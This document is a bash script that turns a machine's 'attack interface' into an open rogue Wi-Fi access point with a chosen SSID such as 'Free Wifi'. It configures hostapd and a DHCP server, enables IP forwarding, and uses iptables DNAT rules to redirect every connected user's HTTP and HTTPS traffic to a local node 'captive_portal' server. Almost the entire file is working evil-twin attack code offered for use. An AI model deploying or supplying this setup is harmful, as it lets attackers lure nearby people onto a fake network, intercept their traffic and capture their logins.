# This script will configure your attack interface to be a wifi access point on the ssid you provide
# and will redirect all the traffic to the ip of the node server running on port 8000 and 8443

print_usage(){
    echo "Usage: ./rerouting_magic.sh --ssid <ssid>"
    echo "Example: ./rerouting_magic.sh --ssid \"Free Wifi\""
}

log(){
    echo "\e[1;32m[`date +"%T"`]\e[0m $1"
}

set -o errexit

while [ "$1" != "" ]; do
    case $1 in
        --ssid )                shift
                                SSID=$1
                                ;;
    esac
    shift
done

if [ -z "$FAKE_AP_INTERFACE" ] || [ -z "$NET_INTERFACE" ]; then
    print_usage
    exit 1
fi

# check if we runing as sudo 
if [ "$EUID" -ne 0 ] ; then
  log "Please run as root"
  print_usage
  exit 1
fi > /dev/null 2>&1

log "starting rerouting magic"
log "Attack interface: $FAKE_AP_INTERFACE"
log "Net interface: $NET_INTERFACE"

log "configuring hostapd and isc-dhcp-server"
# Path: /etc/default/isc-dhcp-server
sudo cp /etc/default/isc-dhcp-server /etc/default/isc-dhcp-server.bak
echo  "
DHCPDv4_CONF=/etc/dhcp/dhcpd.conf
DHCPDv4_PID=/var/run/dhcpd.pid
INTERFACESv4=\"$FAKE_AP_INTERFACE\"
" > /etc/default/isc-dhcp-server

# Path: /etc/dhcp/dhcpd.conf
cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bak
echo  "
ddns-update-style none;
subnet 10.100.102.0 netmask 255.255.255.0 {
  range 10.100.102.51 10.100.102.100;
  option domain-name-servers 8.8.4.4, 8.8.8.8;
  option routers 10.100.102.50;
}" > /etc/dhcp/dhcpd.conf


# Path: /etc/hostapd/hostapd.conf
cp /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.conf.bak
echo  "interface=$FAKE_AP_INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
#wpa=2
#wpa_passphrase=1234567890
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=TKIP
#rsn_pairwise=CCMP
" > /etc/hostapd/hostapd.conf ## uncomment wpa_passphrase if you wish to set a password

# Path: /etc/default/hostapd
cp /etc/default/hostapd /etc/default/hostapd.bak
echo  "DAEMON_CONF=\"/etc/hostapd/hostapd.conf\"" > /etc/default/hostapd

# Path: /etc/sysctl.conf
log "allow forwarding for ipv4"
sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1

if ifconfig $FAKE_AP_INTERFACE > /dev/null; then
    log "interface $FAKE_AP_INTERFACE exists cunfigure it..."
else
  log "interface $FAKE_AP_INTERFACE does not exist it may be blocked by rfkill, unblocking it..."
  sudo rfkill unblock wifi; sudo rfkill unblock all; sudo ifconfig $FAKE_AP_INTERFACE up
fi

ifconfig $FAKE_AP_INTERFACE down
ifconfig $FAKE_AP_INTERFACE inet 10.100.102.50 netmask 255.255.255.0
ifconfig $FAKE_AP_INTERFACE up

log "starting hostapd and isc-dhcp-server"
service hostapd restart
service isc-dhcp-server restart

log "configuring iptables"
iptables --table nat --flush
# NET_IP='127.0.0.1'
# NET_INTERFACE='lo'
iptables -t nat -A PREROUTING -i $FAKE_AP_INTERFACE -p udp --dport 80 -j DNAT --to-destination $NET_IP:8000
iptables -t nat -A PREROUTING -i $FAKE_AP_INTERFACE -p udp --dport 443 -j DNAT --to-destination $NET_IP:8443
iptables -t nat -A PREROUTING -i $FAKE_AP_INTERFACE -p tcp --dport 80 -j DNAT --to-destination $NET_IP:8000
iptables -t nat -A PREROUTING -i $FAKE_AP_INTERFACE -p tcp --dport 443 -j DNAT --to-destination $NET_IP:8443
iptables -t nat -A POSTROUTING -o $NET_INTERFACE -j MASQUERADE

log "starting node server"
cd captive_portal; nohup npm run dev &

log "REROUTING MAGIC IS DONE. THE ATTACK INTERFACE IS NOW A WIFI ACCESS POINT WITH THE SSID: $SSID"